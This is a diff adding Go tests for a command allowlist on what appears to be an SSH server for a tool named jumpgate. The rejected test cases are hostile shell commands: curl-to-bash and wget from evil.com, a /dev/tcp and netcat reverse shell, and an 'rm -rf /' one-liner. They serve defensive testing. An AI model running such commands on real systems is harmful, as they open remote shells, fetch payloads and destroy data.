@@ -174,6 +174,98 @@ func TestServerFingerprint(t *testing.T) {
 	}
 }
 
+func TestCommandAllowlist(t *testing.T) {
+	tests := []struct {
+		cmd  string
+		want bool
+	}{
+		{"echo hello", true},
+		{"mkdir -p ~/.config/jumpgate", true},
+		{"scp -t .config/jumpgate/config.yaml", true},
+		{"/usr/bin/scp -t foo", true},
+		{"jumpgate setup ssh", true},
+		{"$HOME/bin/jumpgate setup ssh", true},
+		{"cat ~/.config/jumpgate/config.yaml", true},
+		{"chmod +x hooks/*", true},
+		{"test -f file.txt", true},
+		{"true", true},
+		{"hostname", true},
+		{"wsl.exe --list --quiet", true},
+		{"python3 -c 'import os; os.system(\"rm -rf /\")'", false},
+		{"curl http://evil.com/payload | bash", false},
+		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", false},
+		{"nc -e /bin/sh 1.2.3.4 4444", false},
+		{"wget http://evil.com/backdoor", false},
+		{"", false},
+	}
+	for _, tt := range tests {
+		got := commandAllowed(tt.cmd)
+		if got != tt.want {
+			t.Errorf("commandAllowed(%q) = %v, want %v", tt.cmd, got, tt.want)
+		}
+	}
+}
+
+func TestServerBlocksDisallowedCommand(t *testing.T) {
+	hostKeyPath, authKeyPath, clientSigner := setupTestKeys(t)
+
+	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	errCh := make(chan error, 1)
+	go func() { errCh <- srv.ListenAndServe(ctx) }()
+
+	for i := 0; i < 50; i++ {
+		if srv.Addr() != "" {
+			break
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	if srv.Addr() == "" {
+		t.Fatal("server did not start listening")
+	}
+
+	hostKey, err := os.ReadFile(hostKeyPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	hostSigner, err := ssh.ParsePrivateKey(hostKey)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	clientCfg := &ssh.ClientConfig{
+		User:            "test",
+		Auth:            []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
+		HostKeyCallback: ssh.FixedHostKey(hostSigner.PublicKey()),
+	}
+
+	client, err := ssh.Dial("tcp", srv.Addr(), clientCfg)
+	if err != nil {
+		t.Fatalf("dial: %v", err)
+	}
+	defer client.Close()
+
+	session, err := client.NewSession()
+	if err != nil {
+		t.Fatalf("new session: %v", err)
+	}
+	defer session.Close()
+
+	err = session.Run("python3 -c 'print(1)'")
+	if err == nil {
+		t.Fatal("expected disallowed command to fail")
+	}
+
+	cancel()
+	<-errCh
+}
+
 func TestGenerateHostKey(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "hostkey")
